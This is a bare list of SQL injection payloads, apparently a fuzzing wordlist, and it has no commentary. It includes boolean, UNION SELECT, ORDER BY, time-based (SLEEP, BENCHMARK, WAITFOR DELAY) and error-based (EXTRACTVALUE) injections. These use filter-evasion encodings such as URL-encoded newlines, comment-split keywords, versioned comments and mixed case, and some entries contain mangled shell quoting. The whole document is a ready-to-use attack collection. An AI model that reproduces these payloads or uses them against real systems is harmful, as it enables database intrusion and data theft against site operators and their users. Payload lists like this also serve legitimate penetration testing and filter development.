  '"%0DwAiTfOr%0DdElAy%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0DwAiTfOr%0DdElAy%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0DwAiTfOr%0DdElAy%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0a%4F%52%0A1=1--'
  '"%0a%4F%52%0a1=1--'
  '"%0a%4f%52%0a1=1--'
  '"%0a/*!50000UNION*/%0aALL%0aSELECT%0a1,2,3,4,5--'
  '"%0a/*!50000UNION*/%0aALL%0aSELECT%0a1,2,3,4--'
  '"%0a/*!50000UNION*/%0aALL%0aSELECT%0a1,2,3--'
  '"%0a/*!50000UNION*/%0aALL%0aSELECT%0a1,2--'
  '"%0a/*!50000UNION*/%0aALL%0aSELECT%0a1--'
  '"%0a/*!50000UNION*/%0aSELECT%0a1,2,3,4,5--'
  '"%0a/*!50000UNION*/%0aSELECT%0a1,2,3,4--'
  '"%0a/*!50000UNION*/%0aSELECT%0a1,2,3--'
  '"%0a/*!50000UNION*/%0aSELECT%0a1,2--'
  '"%0a/*!50000UNION*/%0aSELECT%0a1--'
  '"%0a/*!50000UNION*/%0aSELECT%0aNULL,NULL,NULL,NULL--'
  '"%0a/*!50000UNION*/%0aSELECT%0aNULL,NULL,NULL--'
  '"%0a/*!50000UNION*/%0aSELECT%0aNULL,NULL--'
  '"%0a/*!50000UNION*/%0aSELECT%0aNULL--'
  '"%0aA/**/ND%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0aA/**/ND%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%0aA/**/ND%0a1=1#'
  '"%0aA/**/ND%0a1=1--'
  '"%0aA/**/ND%0a1=1--%0a-'
  '"%0aA/**/ND%0a1=2--'
  '"%0aA/**/ND%0aBENCHMARK(10000000,MD5(1))--'
  '"%0aA/**/ND%0aBENCHMARK(5000000,MD5(1))--'
  '"%0aA/**/ND%0aBENCHMARK(50000000,MD5(1))--'
  '"%0aA/**/ND%0aEXTRACTVALUE(1,CONCAT(0x7e,(SELECT%0a@@version)))--'
  '"%0aA/**/ND%0aSLEEP(0)--'
  '"%0aA/**/ND%0aSLEEP(1)--'
  '"%0aA/**/ND%0aSLEEP(10)--'
  '"%0aA/**/ND%0aSLEEP(15)--'
  '"%0aA/**/ND%0aSLEEP(2)--'
  '"%0aA/**/ND%0aSLEEP(3)--'
  '"%0aA/**/ND%0aSLEEP(5)--'
  '"%0aA/**/nD%0a1=1#'
  '"%0aA/**/nD%0a1=1--'
  '"%0aA/**/nD%0a1=1--%0a-'
  '"%0aAND%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0aAND%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%0aAND%0a1=1#'
  '"%0aAND%0a1=1--'
  '"%0aAND%0a1=1--%0a-'
  '"%0aAND%0a1=2--'
  '"%0aAND%0aBENC/**/HMARK(10000000,MD5(1))--'
  '"%0aAND%0aBENC/**/HMARK(5000000,MD5(1))--'
  '"%0aAND%0aBENC/**/HMARK(50000000,MD5(1))--'
  '"%0aAND%0aBENCHMARK(10000000,MD5(1))--'
  '"%0aAND%0aBENCHMARK(5000000,MD5(1))--'
  '"%0aAND%0aBENCHMARK(50000000,MD5(1))--'
  '"%0aAND%0aEXTRAC/**/TVALUE(1,CONCAT(0x7e,(SELECT%0a@@version)))--'
  '"%0aAND%0aEXTRACTVALUE(1,CONCAT(0x7e,(/*!50000SELECT*/%0a@@version)))--'
  '"%0aAND%0aEXTRACTVALUE(1,CONCAT(0x7e,(SEL/**/ECT%0a@@version)))--'
  '"%0aAND%0aEXTRACTVALUE(1,CONCAT(0x7e,(SELECT%0a@@version)))--'
  '"%0aAND%0aSL/**/EEP(0)--'
  '"%0aAND%0aSL/**/EEP(1)--'
  '"%0aAND%0aSL/**/EEP(10)--'
  '"%0aAND%0aSL/**/EEP(15)--'
  '"%0aAND%0aSL/**/EEP(2)--'
  '"%0aAND%0aSL/**/EEP(3)--'
  '"%0aAND%0aSL/**/EEP(5)--'
  '"%0aAND%0aSLEEP(0)--'
  '"%0aAND%0aSLEEP(1)--'
  '"%0aAND%0aSLEEP(10)--'
  '"%0aAND%0aSLEEP(15)--'
  '"%0aAND%0aSLEEP(2)--'
  '"%0aAND%0aSLEEP(3)--'
  '"%0aAND%0aSLEEP(5)--'
  '"%0aAnD%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0aAnD%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%0aAnD%0a1=1#'
  '"%0aAnD%0a1=1--'
  '"%0aAnD%0a1=1--%0a-'
  '"%0aAnD%0a1=2--'
  '"%0aAnD%0aBeNcHmArK(10000000,mD5(1))--'
  '"%0aAnD%0aBeNcHmArK(5000000,Md5(1))--'
  '"%0aAnD%0aBeNcHmArK(50000000,mD5(1))--'
  '"%0aAnD%0aExTrAcTvAlUe(1,cOnCaT(0x7e,(SeLeCt%0A@@vErSiOn)))--'
  '"%0aAnD%0aExTrAcTvAlUe(1,cOnCaT(0x7e,(SeLeCt%0a@@vErSiOn)))--'
  '"%0aAnD%0aSlEeP(0)--'
  '"%0aAnD%0aSlEeP(1)--'
  '"%0aAnD%0aSlEeP(10)--'
  '"%0aAnD%0aSlEeP(15)--'
  '"%0aAnD%0aSlEeP(2)--'
  '"%0aAnD%0aSlEeP(3)--'
  '"%0aAnD%0aSlEeP(5)--'
  '"%0aO/**/R%091=1--'
  '"%0aO/**/R%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0aO/**/R%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0aO/**/R%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aO/**/R%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%0aO/**/R%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aO/**/R%0a1=1#'
  '"%0aO/**/R%0a1=1--'
  '"%0aO/**/R%0a1=1--%0a-'
  '"%0aO/**/R%0aBENCHMARK(10000000,MD5(1))--'
  '"%0aO/**/R%0aSLEEP(0)--'
  '"%0aO/**/R%0aSLEEP(1)--'
  '"%0aO/**/R%0aSLEEP(10)--'
  '"%0aO/**/R%0aSLEEP(15)--'
  '"%0aO/**/R%0aSLEEP(2)--'
  '"%0aO/**/R%0aSLEEP(3)--'
  '"%0aO/**/R%0aSLEEP(5)--'
  '"%0aO/**/R%0d1=1--'
  '"%0aO/**/RDER%0aBY%0a1--'
  '"%0aO/**/RDER%0aBY%0a10--'
  '"%0aO/**/RDER%0aBY%0a11--'
  '"%0aO/**/RDER%0aBY%0a12--'
  '"%0aO/**/RDER%0aBY%0a13--'
  '"%0aO/**/RDER%0aBY%0a14--'
  '"%0aO/**/RDER%0aBY%0a15--'
  '"%0aO/**/RDER%0aBY%0a2--'
  '"%0aO/**/RDER%0aBY%0a3--'
  '"%0aO/**/RDER%0aBY%0a4--'
  '"%0aO/**/RDER%0aBY%0a5--'
  '"%0aO/**/RDER%0aBY%0a6--'
  '"%0aO/**/RDER%0aBY%0a7--'
  '"%0aO/**/RDER%0aBY%0a8--'
  '"%0aO/**/RDER%0aBY%0a9--'
  '"%0aO/**/r%0A1=1--'
  '"%0aO/**/r%0a1=1#'
  '"%0aO/**/r%0a1=1--'
  '"%0aO/**/r%0a1=1--%0a-'
  '"%0aOO/**/RR%0a1=1--'
  '"%0aOORR%0a1=1--'
  '"%0aOR%091=1--'
  '"%0aOR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0aOR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0aOR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aOR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%0aOR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aOR%0a1=1#'
  '"%0aOR%0a1=1--'
  '"%0aOR%0a1=1--%0a-'
  '"%0aOR%0aBENC/**/HMARK(10000000,MD5(1))--'
  '"%0aOR%0aBENCHMARK(10000000,MD5(1))--'
  '"%0aOR%0aSL/**/EEP(0)--'
  '"%0aOR%0aSL/**/EEP(1)--'
  '"%0aOR%0aSL/**/EEP(10)--'
  '"%0aOR%0aSL/**/EEP(15)--'
  '"%0aOR%0aSL/**/EEP(2)--'
  '"%0aOR%0aSL/**/EEP(3)--'
  '"%0aOR%0aSL/**/EEP(5)--'
  '"%0aOR%0aSLEEP(0)--'
  '"%0aOR%0aSLEEP(1)--'
  '"%0aOR%0aSLEEP(10)--'
  '"%0aOR%0aSLEEP(15)--'
  '"%0aOR%0aSLEEP(2)--'
  '"%0aOR%0aSLEEP(3)--'
  '"%0aOR%0aSLEEP(5)--'
  '"%0aOR%0d1=1--'
  '"%0aOR/**/DER%0aBY%0a1--'
  '"%0aOR/**/DER%0aBY%0a10--'
  '"%0aOR/**/DER%0aBY%0a11--'
  '"%0aOR/**/DER%0aBY%0a12--'
  '"%0aOR/**/DER%0aBY%0a13--'
  '"%0aOR/**/DER%0aBY%0a14--'
  '"%0aOR/**/DER%0aBY%0a15--'
  '"%0aOR/**/DER%0aBY%0a2--'
  '"%0aOR/**/DER%0aBY%0a3--'
  '"%0aOR/**/DER%0aBY%0a4--'
  '"%0aOR/**/DER%0aBY%0a5--'
  '"%0aOR/**/DER%0aBY%0a6--'
  '"%0aOR/**/DER%0aBY%0a7--'
  '"%0aOR/**/DER%0aBY%0a8--'
  '"%0aOR/**/DER%0aBY%0a9--'
  '"%0aORDER%0aBY%0a1--'
  '"%0aORDER%0aBY%0a10--'
  '"%0aORDER%0aBY%0a11--'
  '"%0aORDER%0aBY%0a12--'
  '"%0aORDER%0aBY%0a13--'
  '"%0aORDER%0aBY%0a14--'
  '"%0aORDER%0aBY%0a15--'
  '"%0aORDER%0aBY%0a2--'
  '"%0aORDER%0aBY%0a3--'
  '"%0aORDER%0aBY%0a4--'
  '"%0aORDER%0aBY%0a5--'
  '"%0aORDER%0aBY%0a6--'
  '"%0aORDER%0aBY%0a7--'
  '"%0aORDER%0aBY%0a8--'
  '"%0aORDER%0aBY%0a9--'
  '"%0aOoRr%0A1=1--'
  '"%0aOoRr%0a1=1--'
  '"%0aOr%091=1--'
  '"%0aOr%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0aOr%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0aOr%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aOr%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'
  '"%0aOr%0A'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aOr%0A1=1#'
  '"%0aOr%0A1=1--'
  '"%0aOr%0A1=1--%0A-'
  '"%0aOr%0AbEnChMaRk(10000000,Md5(1))--'
  '"%0aOr%0AsLeEp(0)--'
  '"%0aOr%0AsLeEp(1)--'
  '"%0aOr%0AsLeEp(10)--'
  '"%0aOr%0AsLeEp(15)--'
  '"%0aOr%0AsLeEp(2)--'
  '"%0aOr%0AsLeEp(3)--'
  '"%0aOr%0AsLeEp(5)--'
  '"%0aOr%0D1=1--'
  '"%0aOr%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0aOr%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0aOr%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aOr%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%0aOr%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aOr%0a1=1#'
  '"%0aOr%0a1=1--'
  '"%0aOr%0a1=1--%0a-'
  '"%0aOr%0abEnChMaRk(10000000,Md5(1))--'
  '"%0aOr%0asLeEp(0)--'
  '"%0aOr%0asLeEp(1)--'
  '"%0aOr%0asLeEp(10)--'
  '"%0aOr%0asLeEp(15)--'
  '"%0aOr%0asLeEp(2)--'
  '"%0aOr%0asLeEp(3)--'
  '"%0aOr%0asLeEp(5)--'
  '"%0aOrDeR%0aBy%0A1--'
  '"%0aOrDeR%0aBy%0A10--'
  '"%0aOrDeR%0aBy%0A11--'
  '"%0aOrDeR%0aBy%0A12--'
  '"%0aOrDeR%0aBy%0A13--'
  '"%0aOrDeR%0aBy%0A14--'
  '"%0aOrDeR%0aBy%0A15--'
  '"%0aOrDeR%0aBy%0A2--'
  '"%0aOrDeR%0aBy%0A3--'
  '"%0aOrDeR%0aBy%0A4--'
  '"%0aOrDeR%0aBy%0A5--'
  '"%0aOrDeR%0aBy%0A6--'
  '"%0aOrDeR%0aBy%0A7--'
  '"%0aOrDeR%0aBy%0A8--'
  '"%0aOrDeR%0aBy%0A9--'
  '"%0aOrDeR%0aBy%0a1--'
  '"%0aOrDeR%0aBy%0a10--'
  '"%0aOrDeR%0aBy%0a11--'
  '"%0aOrDeR%0aBy%0a12--'
  '"%0aOrDeR%0aBy%0a13--'
  '"%0aOrDeR%0aBy%0a14--'
  '"%0aOrDeR%0aBy%0a15--'
  '"%0aOrDeR%0aBy%0a2--'
  '"%0aOrDeR%0aBy%0a3--'
  '"%0aOrDeR%0aBy%0a4--'
  '"%0aOrDeR%0aBy%0a5--'
  '"%0aOrDeR%0aBy%0a6--'
  '"%0aOrDeR%0aBy%0a7--'
  '"%0aOrDeR%0aBy%0a8--'
  '"%0aOrDeR%0aBy%0a9--'
  '"%0aUN/**/ION%0aALL%0aSELECT%0a1,2,3,4,5--'
  '"%0aUN/**/ION%0aALL%0aSELECT%0a1,2,3,4--'
  '"%0aUN/**/ION%0aALL%0aSELECT%0a1,2,3--'
  '"%0aUN/**/ION%0aALL%0aSELECT%0a1,2--'
  '"%0aUN/**/ION%0aALL%0aSELECT%0a1--'
  '"%0aUN/**/ION%0aSELECT%0a1,2,3,4,5--'
  '"%0aUN/**/ION%0aSELECT%0a1,2,3,4--'
  '"%0aUN/**/ION%0aSELECT%0a1,2,3--'
  '"%0aUN/**/ION%0aSELECT%0a1,2--'
  '"%0aUN/**/ION%0aSELECT%0a1--'
  '"%0aUN/**/ION%0aSELECT%0aNULL,NULL,NULL,NULL--'
  '"%0aUN/**/ION%0aSELECT%0aNULL,NULL,NULL--'
  '"%0aUN/**/ION%0aSELECT%0aNULL,NULL--'
  '"%0aUN/**/ION%0aSELECT%0aNULL--'
  '"%0aUNION%0a/*!50000SELECT*/%0a1,2,3,4,5--'
  '"%0aUNION%0a/*!50000SELECT*/%0a1,2,3,4--'
  '"%0aUNION%0a/*!50000SELECT*/%0a1,2,3--'
  '"%0aUNION%0a/*!50000SELECT*/%0a1,2--'
  '"%0aUNION%0a/*!50000SELECT*/%0a1--'
  '"%0aUNION%0a/*!50000SELECT*/%0aNULL,NULL,NULL,NULL--'
  '"%0aUNION%0a/*!50000SELECT*/%0aNULL,NULL,NULL--'
  '"%0aUNION%0a/*!50000SELECT*/%0aNULL,NULL--'
  '"%0aUNION%0a/*!50000SELECT*/%0aNULL--'
  '"%0aUNION%0aALL%0a/*!50000SELECT*/%0a1,2,3,4,5--'
  '"%0aUNION%0aALL%0a/*!50000SELECT*/%0a1,2,3,4--'
  '"%0aUNION%0aALL%0a/*!50000SELECT*/%0a1,2,3--'
  '"%0aUNION%0aALL%0a/*!50000SELECT*/%0a1,2--'
  '"%0aUNION%0aALL%0a/*!50000SELECT*/%0a1--'
  '"%0aUNION%0aALL%0aSEL/**/ECT%0a1,2,3,4,5--'
  '"%0aUNION%0aALL%0aSEL/**/ECT%0a1,2,3,4--'
  '"%0aUNION%0aALL%0aSEL/**/ECT%0a1,2,3--'
  '"%0aUNION%0aALL%0aSEL/**/ECT%0a1,2--'
  '"%0aUNION%0aALL%0aSEL/**/ECT%0a1--'
  '"%0aUNION%0aALL%0aSELECT%0a1,2,3,4,5--'
  '"%0aUNION%0aALL%0aSELECT%0a1,2,3,4--'
  '"%0aUNION%0aALL%0aSELECT%0a1,2,3--'
  '"%0aUNION%0aALL%0aSELECT%0a1,2--'
  '"%0aUNION%0aALL%0aSELECT%0a1--'
  '"%0aUNION%0aSEL/**/ECT%0a1,2,3,4,5--'
  '"%0aUNION%0aSEL/**/ECT%0a1,2,3,4--'
  '"%0aUNION%0aSEL/**/ECT%0a1,2,3--'
  '"%0aUNION%0aSEL/**/ECT%0a1,2--'
  '"%0aUNION%0aSEL/**/ECT%0a1--'
  '"%0aUNION%0aSEL/**/ECT%0aNULL,NULL,NULL,NULL--'
  '"%0aUNION%0aSEL/**/ECT%0aNULL,NULL,NULL--'
  '"%0aUNION%0aSEL/**/ECT%0aNULL,NULL--'
  '"%0aUNION%0aSEL/**/ECT%0aNULL--'
  '"%0aUNION%0aSELECT%0a1,2,3,4,5--'
  '"%0aUNION%0aSELECT%0a1,2,3,4--'
  '"%0aUNION%0aSELECT%0a1,2,3--'
  '"%0aUNION%0aSELECT%0a1,2--'
  '"%0aUNION%0aSELECT%0a1--'
  '"%0aUNION%0aSELECT%0aNULL,NULL,NULL,NULL--'
  '"%0aUNION%0aSELECT%0aNULL,NULL,NULL--'
  '"%0aUNION%0aSELECT%0aNULL,NULL--'
  '"%0aUNION%0aSELECT%0aNULL--'
  '"%0aUnIoN%0aAlL%0aSeLeCt%0A1,2,3,4,5--'
  '"%0aUnIoN%0aAlL%0aSeLeCt%0A1,2,3,4--'
  '"%0aUnIoN%0aAlL%0aSeLeCt%0A1,2,3--'
  '"%0aUnIoN%0aAlL%0aSeLeCt%0A1,2--'
  '"%0aUnIoN%0aAlL%0aSeLeCt%0A1--'
  '"%0aUnIoN%0aAlL%0aSeLeCt%0a1,2,3,4,5--'
  '"%0aUnIoN%0aAlL%0aSeLeCt%0a1,2,3,4--'
  '"%0aUnIoN%0aAlL%0aSeLeCt%0a1,2,3--'
  '"%0aUnIoN%0aAlL%0aSeLeCt%0a1,2--'
  '"%0aUnIoN%0aAlL%0aSeLeCt%0a1--'
  '"%0aUnIoN%0aSeLeCt%0A1,2,3,4,5--'
  '"%0aUnIoN%0aSeLeCt%0A1,2,3,4--'
  '"%0aUnIoN%0aSeLeCt%0A1,2,3--'
  '"%0aUnIoN%0aSeLeCt%0A1,2--'
  '"%0aUnIoN%0aSeLeCt%0A1--'
  '"%0aUnIoN%0aSeLeCt%0AnUlL,NuLl,nUlL,NuLl--'
  '"%0aUnIoN%0aSeLeCt%0AnUlL,NuLl,nUlL--'
  '"%0aUnIoN%0aSeLeCt%0AnUlL,NuLl--'
  '"%0aUnIoN%0aSeLeCt%0AnUlL--'
  '"%0aUnIoN%0aSeLeCt%0a1,2,3,4,5--'
  '"%0aUnIoN%0aSeLeCt%0a1,2,3,4--'
  '"%0aUnIoN%0aSeLeCt%0a1,2,3--'
  '"%0aUnIoN%0aSeLeCt%0a1,2--'
  '"%0aUnIoN%0aSeLeCt%0a1--'
  '"%0aUnIoN%0aSeLeCt%0anUlL,NuLl,nUlL,NuLl--'
  '"%0aUnIoN%0aSeLeCt%0anUlL,NuLl,nUlL--'
  '"%0aUnIoN%0aSeLeCt%0anUlL,NuLl--'
  '"%0aUnIoN%0aSeLeCt%0anUlL--'
  '"%0aWAITFO/**/R%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFO/**/R%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFO/**/R%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFO/**/R%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFO/**/R%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFO/**/R%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFOR%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFOR%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFOR%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFOR%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFOR%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWAITFOR%0aDELAY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWaItFoR%0aDeLaY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWaItFoR%0aDeLaY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWaItFoR%0aDeLaY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWaItFoR%0aDeLaY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWaItFoR%0aDeLaY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aWaItFoR%0aDeLaY%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aa/**/Nd%0a1=1#'
  '"%0aa/**/Nd%0a1=1--'
  '"%0aa/**/Nd%0a1=1--%0a-'
  '"%0aa/**/nd%0a1=1#'
  '"%0aa/**/nd%0a1=1--'
  '"%0aa/**/nd%0a1=1--%0a-'
  '"%0aaNd%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0aaNd%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%0aaNd%0a1=1#'
  '"%0aaNd%0a1=1--'
  '"%0aaNd%0a1=1--%0a-'
  '"%0aaNd%0a1=2--'
  '"%0aaNd%0abEnChMaRk(10000000,Md5(1))--'
  '"%0aaNd%0abEnChMaRk(5000000,mD5(1))--'
  '"%0aaNd%0abEnChMaRk(50000000,Md5(1))--'
  '"%0aaNd%0aeXtRaCtVaLuE(1,CoNcAt(0X7E,(sElEcT%0a@@VeRsIoN)))--'
  '"%0aaNd%0asLeEp(0)--'
  '"%0aaNd%0asLeEp(1)--'
  '"%0aaNd%0asLeEp(10)--'
  '"%0aaNd%0asLeEp(15)--'
  '"%0aaNd%0asLeEp(2)--'
  '"%0aaNd%0asLeEp(3)--'
  '"%0aaNd%0asLeEp(5)--'
  '"%0aand%0a1=1#'
  '"%0aand%0a1=1--'
  '"%0aand%0a1=1--%0a-'
  '"%0ao/**/R%0a1=1#'
  '"%0ao/**/R%0a1=1--'
  '"%0ao/**/R%0a1=1--%0a-'
  '"%0ao/**/r%0a1=1#'
  '"%0ao/**/r%0a1=1--'
  '"%0ao/**/r%0a1=1--%0a-'
  '"%0aoOrR%0a1=1--'
  '"%0aoR%091=1--'
  '"%0aoR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0aoR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0aoR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
